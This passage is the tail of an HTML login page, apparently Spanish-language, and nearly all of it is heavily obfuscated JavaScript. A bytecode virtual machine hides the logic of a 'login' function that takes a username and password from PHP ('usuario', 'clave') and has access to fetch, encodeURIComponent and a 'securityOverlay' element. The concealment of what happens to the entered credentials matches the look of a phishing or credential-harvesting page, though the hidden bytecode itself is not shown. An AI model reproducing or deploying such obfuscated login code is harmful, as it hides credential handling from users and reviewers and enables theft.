0x8:{ja[jn++]=jF[Cr],jw++;continue;}case 0x7:{jq[Cr]=ja[--jn],jw++;continue;}case 0x32:{jw=jI[jw];continue;}case 0x2e:{let Cu=ja[--jn],CO=ja[--jn];ja[jn++]=CO>Cu,jw++;continue;}case 0x1:{ja[jn++]=undefined,jw++;continue;}case 0x49:{let Cz=ja[--jn],Co=ja[--jn],Ct=ja[--jn];if(Ct===null||Ct===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(Co)+'\x27\x20of\x20'+Ct);if(jP){if(!Reflect['set'](Ct,Co,Cz))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(Co)+'\x27\x20of\x20object');}else Ct[Co]=Cz;ja[jn++]=Cz,jw++;continue;}case 0xb:{let Ck=ja[--jn],CT=ja[--jn];ja[jn++]=CT-Ck,jw++;continue;}case 0x3:{ja[--jn],jw++;continue;}case 0x1c:{let CX=ja[--jn];ja[jn++]=typeof CX===f?CX:+CX,jw++;continue;}case 0xa:{let CL=ja[--jn],CR=ja[--jn];ja[jn++]=CR+CL,jw++;continue;}}CY=Cx;if(CQ<0x5a){if(Cv(CQ,Cr)){if(Cy>0x0){CG();continue;}return CZ;}}else{if(CQ<0xc8){if(CS(CQ,Cr)){if(Cy>0x0){CG();continue;}return CZ;}}else{if(CD(CQ,Cr)){if(Cy>0x0){CG();continue;}return CZ;}}}C9=Cx['_$UP7JxF'],Cl=Cx['_$LXelx5'];}break;}catch(Cm){if(jk&&jk['length']>0x0){let CV=jk[jk['length']-0x1];jn=CV['_$jcGxNK'];if(CV['_$lQFkUz']!==undefined)C2(Cm),jw=CV['_$lQFkUz'],CV['_$lQFkUz']=undefined,CV['_$vKxByc']===undefined&&jk['pop']();else CV['_$vKxByc']!==undefined?(jw=CV['_$vKxByc'],CV['_$Bn3NBW']=Cm):(jw=CV['_$lhqrKM'],jk['pop']());continue;}throw Cm;}}return jn>0x0?ja[--jn]:Cl?jA:undefined;}return Ci(0x0);}function*k(jB,jF,jK,jQ,jr,jA){let ja=t(jB,jF,jK,jQ,jr,jA);while(!![]){if(ja&&typeof ja==='object'&&ja['_$bh7Fvy']!==undefined){let jn=ja['_d'],jq;try{jq=yield ja;}catch(jw){ja=jn(0x2,jw);continue;}jq&&typeof jq==='object'&&jq['_$bh7Fvy']===y?ja=jn(0x3,jq['_$pfe8lb']):ja=jn(0x1,jq);}else return ja;}}let T=function(jB,jF,jK,jQ,jr,jA){vmg_717f62['_$m7f5kZ']?vmg_717f62['_$m7f5kZ']=![]:vmg_717f62['_$yi8Vf9']=undefined;let ja=typeof jB==='object'?jB:jv(jB);return o(ja,jF,jK,jQ,jr,jA);},X=0x0,L=0x1,R=0x2,m=0x3,V=0x4,H=0x5,P=0x6,h=0x7,c=0x8,p=0x9,j0=0xa,j1=0x1,j2=0x2,j3=0x4,j4=0x8,j5=0x20,j6=0x40,j7=0x80,j8=0x100,j9=0x200,jj=0x400,jC=0x800,jl=0x1000,jE=0x2000,jN=0x4000,jy=0x8000,jx=0x10000,ji=0x20000,jg=0x40000,jf=0x80000;function jU(jB){this['_$wC94HZ']=jB,this['_$EwPrvO']=new DataView(jB['buffer'],jB['byteOffset'],jB['byteLength']),this['_$plzqre']=0x0;}jU['prototype']['_$xjcfIL']=function(){return this['_$wC94HZ'][this['_$plzqre']++];},jU['prototype']['_$dvVmGt']=function(){let jB=this['_$EwPrvO']['getUint16'](this['_$plzqre'],!![]);return this['_$plzqre']+=0x2,jB;},jU['prototype']['_$VSDuJi']=function(){let jB=this['_$EwPrvO']['getUint32'](this['_$plzqre'],!![]);return this['_$plzqre']+=0x4,jB;},jU['prototype']['_$IOYHN2']=function(){let jB=this['_$EwPrvO']['getInt32'](this['_$plzqre'],!![]);return this['_$plzqre']+=0x4,jB;},jU['prototype']['_$jQNY7h']=function(){let jB=this['_$EwPrvO']['getFloat64'](this['_$plzqre'],!![]);return this['_$plzqre']+=0x8,jB;},jU['prototype']['_$YJdB2e']=function(){let jB=0x0,jF=0x0,jK;do{jK=this['_$xjcfIL'](),jB|=(jK&0x7f)<<jF,jF+=0x7;}while(jK>=0x80);return jB>>>0x1^-(jB&0x1);},jU['prototype']['_$DJ5eFg']=function(){let jB=this['_$YJdB2e'](),jF=this['_$wC94HZ'],jK=this['_$plzqre'],jQ=jK+jB;this['_$plzqre']=jQ;var jr='';while(jK<jQ){var jA=jF[jK++];if(jA<0x80)jr+=String['fromCharCode'](jA);else{if(jA<0xe0)jr+=String['fromCharCode']((jA&0x1f)<<0x6|jF[jK++]&0x3f);else{if(jA<0xf0)jr+=String['fromCharCode']((jA&0xf)<<0xc|(jF[jK++]&0x3f)<<0x6|jF[jK++]&0x3f);else{var ja=(jA&0x7)<<0x12|(jF[jK++]&0x3f)<<0xc|(jF[jK++]&0x3f)<<0x6|jF[jK++]&0x3f;ja-=0x10000,jr+=String['fromCharCode']((ja>>0xa)+0xd800,(ja&0x3ff)+0xdc00);}}}}return jr;};var jd='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',jM=new Uint8Array(0x80);for(var jb=0x0;jb<jd['length'];jb++){jM[jd['charCodeAt'](jb)]=jb;}function jZ(jB){var jF=jB['charCodeAt'](jB['length']-0x1)===0x3d?jB['charCodeAt'](jB['length']-0x2)===0x3d?0x2:0x1:0x0,jK=(jB['length']*0x3>>0x2)-jF,jQ=new Uint8Array(jK),jr=0x0;for(var jA=0x0;jA<jB['length'];jA+=0x4){var ja=jM[jB['charCodeAt'](jA)],jn=jM[jB['charCodeAt'](jA+0x1)],jq=jM[jB['charCodeAt'](jA+0x2)],jw=jM[jB['charCodeAt'](jA+0x3)];jQ[jr++]=ja<<0x2|jn>>0x4,jr<jK&&(jQ[jr++]=(jn&0xf)<<0x4|jq>>0x2),jr<jK&&(jQ[jr++]=(jq&0x3)<<0x6|jw);}return jQ;}function jY(jB){let jF=jB['_$xjcfIL']();switch(jF){case X:return null;case L:return undefined;case R:return![];case m:return!![];case V:{let jK=jB['_$xjcfIL']();return jK>0x7f?jK-0x100:jK;}case H:{let jQ=jB['_$dvVmGt']();return jQ>0x7fff?jQ-0x10000:jQ;}case P:return jB['_$IOYHN2']();case h:return jB['_$jQNY7h']();case c:return jB['_$DJ5eFg']();case p:return BigInt(jB['_$DJ5eFg']());case j0:{let jr=jB['_$DJ5eFg'](),jA=jB['_$DJ5eFg']();return new RegExp(jr,jA);}default:return null;}}function jG(jB){let jF=typeof jB==='string'?jZ(jB):jB,jK=new jU(jF),jQ=jK['_$xjcfIL'](),jr=jK['_$VSDuJi'](),jA=jK['_$YJdB2e'](),ja=jK['_$YJdB2e'](),jn=[];jn[0xb]=jA,jn[0xd]=ja;jr&j4&&(jn[0x16]=jK['_$YJdB2e']());if(jr&j5){let jz=jK['_$YJdB2e'](),jo={};for(let jt=0x0;jt<jz;jt++){let jk=jK['_$YJdB2e'](),jT=jK['_$YJdB2e']();jo[jk]=jT;}jn[0x0]=jo;}jr&j6&&(jn[0x9]=jK['_$VSDuJi']());jr&j7&&(jn[0x15]=jK['_$VSDuJi']());jr&j8&&(jn[0x6]=jK['_$VSDuJi']());jr&j9&&(jn[0x14]=jK['_$YJdB2e']());jr&jj&&(jn[0x11]=jK['_$VSDuJi']());jr&jf&&(jn[0xa]=jK['_$YJdB2e']());jr&j1&&(jn[0x4]=0x1);jr&j2&&(jn[0x12]=0x1);jr&j3&&(jn[0x7]=0x1);jr&jN&&(jn[0x10]=0x1);jr&jy&&(jn[0x1]=0x1);jr&jx&&(jn[0x8]=0x1);jr&ji&&(jn[0x3]=0x1);jr&jg&&(jn[0x5]=0x1);jr&jE&&(jn[0xf]=0x1);let jq=jK['_$YJdB2e'](),jw=new Array(jq);for(let jX=0x0;jX<jq;jX++){jw[jX]=jY(jK);}jn[0x2]=jw;function jJ(jL){let jR=jL['_$xjcfIL']();switch(jR){case X:return null;case V:{let jm=jL['_$xjcfIL']();return jm>0x7f?jm-0x100:jm;}case H:{let jV=jL['_$dvVmGt']();return jV>0x7fff?jV-0x10000:jV;}case P:return jL['_$IOYHN2']();case h:return jL['_$jQNY7h']();case c:return jL['_$DJ5eFg']();default:return null;}}let js=jK['_$YJdB2e'](),jI=js<<0x1,jW=new Array(jI),ju=0x0,jO=(jA*0x1f^ja*0x11^js*0xd^jq*0x7)>>>0x0&0x3;switch(jO){case 0x1:for(let jL=0x0;jL<js;jL++){let jR=jJ(jK),jm=jK['_$YJdB2e']();jW[ju++]=jR,jW[ju++]=jm;}break;case 0x2:{let jV=new Array(js);for(let jH=0x0;jH<js;jH++){jV[jH]=jK['_$YJdB2e']();}for(let jP=0x0;jP<js;jP++){jW[ju++]=jV[jP];}for(let je=0x0;je<js;je++){jW[ju++]=jJ(jK);}break;}case 0x3:{let jh=new Array(js);for(let jc=0x0;jc<js;jc++){jh[jc]=jJ(jK);}for(let jp=0x0;jp<js;jp++){jW[ju++]=jh[jp];}for(let C0=0x0;C0<js;C0++){jW[ju++]=jK['_$YJdB2e']();}break;}case 0x0:default:for(let C1=0x0;C1<js;C1++){jW[ju++]=jK['_$YJdB2e'](),jW[ju++]=jJ(jK);}break;}jn[0xc]=jW;if(jr&jC){let C2=jK['_$YJdB2e'](),C3={};for(let C4=0x0;C4<C2;C4++){let C5=jK['_$YJdB2e'](),C6=jK['_$YJdB2e']();C3[C5]=C6;}jn[0x13]=C3;}if(jr&jl){let C7=jK['_$YJdB2e'](),C8={};for(let C9=0x0;C9<C7;C9++){let Cj=jK['_$YJdB2e'](),CC=jK['_$YJdB2e']()-0x1,Cl=jK['_$YJdB2e']()-0x1,CE=jK['_$YJdB2e']()-0x1;C8[Cj]=[CC,Cl,CE];}jn[0xe]=C8;}return jn;}let jv=function(jB){let jF=j;j=null;let jK=null,jQ={};return function(jr){let jA=jK?jK[jr]:jr;if(jQ[jA])return jQ[jA];let ja=jF[jA];return typeof ja==='string'?jQ[jA]=jB(ja):jQ[jA]=ja,jQ[jA];};}(jG),jS=async function(jB,jF,jK,jQ,jr,jA,ja){let jn=typeof jB==='object'?jB:jv(jB),jq=k(jn,jF,jK,jQ,jr,ja),jw=jq['next']();while(!jw['done']){if(jw['value']['_$bh7Fvy']!==l)throw new Error('Unexpected\x20yield\x20in\x20async\x20context');try{let jJ=await Promise['resolve'](jw['value']['_$pfe8lb']);vmg_717f62['_$yi8Vf9']=jA,jw=jq['next'](jJ);}catch(js){vmg_717f62['_$yi8Vf9']=jA,jw=jq['throw'](js);}}return jw['value'];},jD=function(jB,jF,jK,jQ,jr,jA){let ja=typeof jB==='object'?jB:jv(jB),jn=k(ja,jF,jK,jQ,undefined,jA),jq=![],jw=null,jJ=undefined,js=![];function jI(jt,jk){if(jq)return{'value':undefined,'done':!![]};vmg_717f62['_$yi8Vf9']=jr;if(jw){let jX;try{if(jk){if(typeof jw['throw']==='function')jX=jw['throw'](jt);else{typeof jw['return']==='function'&&jw['return']();jw=null;throw new TypeError('The\x20iterator\x20does\x20not\x20provide\x20a\x20\x27throw\x27\x20method.');}}else jX=jw['next'](jt);if(jX!==null&&typeof jX==='object'){}else{jw=null;throw new TypeError('Iterator\x20result\x20'+jX+'\x20is\x20not\x20an\x20object');}}catch(jL){jw=null;try{let jR=jn['throw'](jL);return jW(jR);}catch(jm){jq=!![];throw jm;}}if(!jX['done'])return{'value':jX['value'],'done':![]};jw=null,jt=jX['value'],jk=![];}let jT;try{jT=jk?jn['throw'](jt):jn['next'](jt);}catch(jV){jq=!![];throw jV;}return jW(jT);}function jW(jt){if(jt['done']){jq=!![];if(js)return js=![],{'value':jJ,'done':!![]};return{'value':jt['value'],'done':!![]};}let jk=jt['value'];if(jk['_$bh7Fvy']===E)return{'value':jk['_$pfe8lb'],'done':![]};if(jk['_$bh7Fvy']===N){let jT=jk['_$pfe8lb'],jX=jT;jX&&typeof jX[Symbol['iterator']]==='function'&&(jX=jX[Symbol['iterator']]());if(jX&&typeof jX['next']==='function'){let jL=jX['next']();if(!jL['done'])return jw=jX,{'value':jL['value'],'done':![]};return jI(jL['value'],![]);}return jI(undefined,![]);}throw new Error('Unexpected\x20signal\x20in\x20generator');}let ju=ja&&ja[0x12],jO=async function(jt){if(jq)return{'value':jt,'done':!![]};if(jw&&typeof jw['return']==='function'){try{await jw['return']();}catch(jT){}jw=null;}let jk;try{vmg_717f62['_$yi8Vf9']=jr,jk=jn['next']({['_$bh7Fvy']:y,['_$pfe8lb']:jt});}catch(jX){jq=!![];throw jX;}while(!jk['done']){let jL=jk['value'];if(jL['_$bh7Fvy']===l)try{let jR=await Promise['resolve'](jL['_$pfe8lb']);vmg_717f62['_$yi8Vf9']=jr,jk=jn['next'](jR);}catch(jm){vmg_717f62['_$yi8Vf9']=jr,jk=jn['throw'](jm);}else{if(jL['_$bh7Fvy']===E)try{vmg_717f62['_$yi8Vf9']=jr,jk=jn['next']();}catch(jV){jq=!![];throw jV;}else break;}}return jq=!![],{'value':jk['value'],'done':!![]};},jz=function(jt){if(jq)return{'value':jt,'done':!![]};if(jw&&typeof jw['return']==='function'){let jT;try{jT=jw['return'](jt);if(jT===null||typeof jT!=='object')throw new TypeError('Iterator\x20result\x20'+jT+'\x20is\x20not\x20an\x20object');}catch(jX){jw=null;let jL;try{jL=jn['throw'](jX);}catch(jR){jq=!![];throw jR;}return jW(jL);}if(!jT['done'])return{'value':jT['value'],'done':![]};jw=null;}jJ=jt,js=!![];let jk;try{vmg_717f62['_$yi8Vf9']=jr,jk=jn['next']({['_$bh7Fvy']:y,['_$pfe8lb']:jt});}catch(jm){jq=!![],js=![];throw jm;}if(!jk['done']&&jk['value']&&jk['value']['_$bh7Fvy']===E)return{'value':jk['value']['_$pfe8lb'],'done':![]};return jq=!![],js=![],{'value':jk['value'],'done':!![]};};if(ju){let jt=async function(jk,jT){if(jq)return{'value':undefined,'done':!![]};vmg_717f62['_$yi8Vf9']=jr;if(jw){let jL;try{jL=jT?typeof jw['throw']==='function'?await jw['throw'](jk):(jw=null,(function(){throw jk;}())):await jw['next'](jk);}catch(jR){jw=null;try{vmg_717f62['_$yi8Vf9']=jr;let jm=jn['throw'](jR);return await jo(jm);}catch(jV){jq=!![];throw jV;}}if(!jL['done'])return{'value':jL['value'],'done':![]};jw=null,jk=jL['value'],jT=![];}let jX;try{jX=jT?jn['throw'](jk):jn['next'](jk);}catch(jH){jq=!![];throw jH;}return await jo(jX);};async function jo(jk){while(!jk['done']){let jT=jk['value'];if(jT['_$bh7Fvy']===l){let jX;try{jX=await Promise['resolve'](jT['_$pfe8lb']),vmg_717f62['_$yi8Vf9']=jr,jk=jn['next'](jX);}catch(jL){vmg_717f62['_$yi8Vf9']=jr,jk=jn['throw'](jL);}continue;}if(jT['_$bh7Fvy']===E)return{'value':jT['_$pfe8lb'],'done':![]};if(jT['_$bh7Fvy']===N){let jR=jT['_$pfe8lb'],jm=jR;if(jm&&typeof jm[Symbol['asyncIterator']]==='function')jm=jm[Symbol['asyncIterator']]();else jm&&typeof jm[Symbol['iterator']]==='function'&&(jm=jm[Symbol['iterator']]());if(jm&&typeof jm['next']==='function'){let jV=await jm['next']();if(!jV['done'])return jw=jm,{'value':jV['value'],'done':![]};vmg_717f62['_$yi8Vf9']=jr,jk=jn['next'](jV['value']);continue;}vmg_717f62['_$yi8Vf9']=jr,jk=jn['next'](undefined);continue;}throw new Error('Unexpected\x20signal\x20in\x20async\x20generator');}jq=!![];if(js)return js=![],{'value':jJ,'done':!![]};return{'value':jk['value'],'done':!![]};}return{'next':function(jk){return jt(jk,![]);},'return':jO,'throw':function(jk){if(jq)return Promise['reject'](jk);return jt(jk,!![]);},[Symbol['asyncIterator']]:function(){return this;}};}else return{'next':function(jk){return jI(jk,![]);},'return':jz,'throw':function(jk){if(jq)throw jk;return jI(jk,!![]);},[Symbol['iterator']]:function(){return this;}};};return function(jB,jF,jK,jQ,jr,jA){let ja=jv(jB),jn=jA;if(ja&&ja[0x7]){let jq=vmg_717f62['_$yi8Vf9'];return jD(ja,jF,jK,jQ,jq,jn);}if(ja&&ja[0x12]){let jw=vmg_717f62['_$yi8Vf9'];return jS(ja,jF,jK,jQ,jr,jw,jn);}if(ja&&ja[0x1]&&jn===vmd)return T(ja,jF,jK,jQ,jr,undefined);return T(ja,jF,jK,jQ,jr,jn);};}());try{document,Object['defineProperty'](vmg_717f62,'document',{'get':function(){return document;},'set':function(j){document=j;},'configurable':!![]});}catch(vmy7){}try{console,Object['defineProperty'](vmg_717f62,'console',{'get':function(){return console;},'set':function(j){console=j;},'configurable':!![]});}catch(vmy8){}try{fetch,Object['defineProperty'](vmg_717f62,'fetch',{'get':function(){return fetch;},'set':function(j){fetch=j;},'configurable':!![]});}catch(vmy9){}try{encodeURIComponent,Object['defineProperty'](vmg_717f62,'encodeURIComponent',{'get':function(){return encodeURIComponent;},'set':function(j){encodeURIComponent=j;},'configurable':!![]});}catch(vmyj){}try{setTimeout,Object['defineProperty'](vmg_717f62,'setTimeout',{'get':function(){return setTimeout;},'set':function(j){setTimeout=j;},'configurable':!![]});}catch(vmyC){}try{window,Object['defineProperty'](vmg_717f62,'window',{'get':function(){return window;},'set':function(j){window=j;},'configurable':!![]});}catch(vmyl){}vmg_717f62['login']=login;globalThis['login']=vmg_717f62['login'];vmg_717f62['_$5efjzU']={'usuario':!![],'clave':!![],'userInput':!![],'loginBtn':!![],'overlay':!![],'running':!![]};let usuario='<?php\x20echo\x20$usuario;\x20?>';vmg_717f62['usuario']=usuario;globalThis['usuario']=vmg_717f62['usuario'];vmg_717f62['usuario']=usuario;globalThis['usuario']=usuario;delete vmg_717f62['_$5efjzU']['usuario'];let clave='<?php\x20echo\x20$clave;\x20?>';vmg_717f62['clave']=clave;globalThis['clave']=vmg_717f62['clave'];vmg_717f62['clave']=clave;globalThis['clave']=clave;delete vmg_717f62['_$5efjzU']['clave'];const userInput=document['querySelector']('input[type=\x22text\x22]');vmg_717f62['userInput']=userInput;globalThis['userInput']=vmg_717f62['userInput'];vmg_717f62['userInput']=userInput;globalThis['userInput']=userInput;delete vmg_717f62['_$5efjzU']['userInput'];const loginBtn=document['getElementById']('loginBtn');vmg_717f62['loginBtn']=loginBtn;globalThis['loginBtn']=vmg_717f62['loginBtn'];vmg_717f62['loginBtn']=loginBtn;globalThis['loginBtn']=loginBtn;delete vmg_717f62['_$5efjzU']['loginBtn'];const overlay=document['getElementById']('securityOverlay');vmg_717f62['overlay']=overlay;globalThis['overlay']=vmg_717f62['overlay'];vmg_717f62['overlay']=overlay;globalThis['overlay']=overlay;delete vmg_717f62['_$5efjzU']['overlay'];let running=![];vmg_717f62['running']=running;globalThis['running']=vmg_717f62['running'];vmg_717f62['running']=running;globalThis['running']=running;delete vmg_717f62['_$5efjzU']['running'],userInput['addEventListener']('input',function(){return vmN_874149(0x0,Array['from'](arguments),{['_$IYp3QS']:undefined,['_$9omHYP']:{'userInput':userInput,'loginBtn':loginBtn},['_$o3JtVK']:{['userInput']:!![],['loginBtn']:!![]}},undefined,new.target,this);});async function login(){return vmN_874149(0x6,Array['from'](arguments),{['_$IYp3QS']:undefined,['_$9omHYP']:Object['defineProperties']({'overlay':overlay},{['usuario']:{'get':function(){return usuario;},'set':function(j){usuario=j;},'enumerable':!![]},['clave']:{'get':function(){return clave;},'set':function(j){clave=j;},'enumerable':!![]},['running']:{'get':function(){return running;},'set':function(j){running=j;},'enumerable':!![]}}),['_$o3JtVK']:{['overlay']:!![]}},undefined,new.target,this);}
     </script>

</body>
</html>
